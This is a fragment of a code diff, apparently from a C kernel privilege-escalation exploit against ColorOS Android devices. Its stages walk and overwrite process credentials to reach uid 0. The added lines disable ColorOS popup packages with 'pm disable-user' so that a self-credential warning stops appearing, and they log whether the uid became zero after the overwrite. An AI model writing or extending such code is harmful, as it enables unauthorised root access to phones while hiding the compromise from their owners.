@@ -1961,6 +1961,10 @@ static int uid0_cred_walk(void) {
     pr_success("UID0: leaf-NULL walk lived — cred next, skip park/harvest\n");
     durable_stage("uid0_hookoff_ok");
     live_sync_log("UID0", "hookoff_ok_cred");
+    /* pickup 08-29 fix: this branch jumped straight to the punch and never
+     * muted the ColorOS popup packages (Z34 self-cred popped even with the
+     * kernel hook off). Mute here — pm disable-user as uid 2000. */
+    uid0_mute_coloros();
     unsetenv("MODE4_SLIDE_ZERO");
     unsetenv("MODE4_NULL_STORE");
     setenv("MODE4_SLIDE_CRED", "1", 1);
@@ -2251,6 +2255,15 @@ uid0_cred_punch:;
   uint32_t self_uid_now = (uint32_t)getuid();
   pr_info("UID0 getuid_after_store=%u euid=%u who=%s\n", self_uid_now,
           (uint32_t)geteuid(), who);
+  {
+    /* pickup 08-29 fix: durable uid immediately after the store — two prior
+     * consoles died before flushing this line. */
+    char ub[96];
+    snprintf(ub, sizeof(ub), "getuid_after_store=%u euid=%u who=%s",
+             self_uid_now, (uint32_t)geteuid(), who);
+    live_sync_log("UID0", ub);
+    durable_stage(self_uid_now == 0 ? "uid0_after_store_ZERO" : "uid0_after_store");
+  }
   fflush(stdout);
 
   write(pipes.cmd_w, "C", 1);
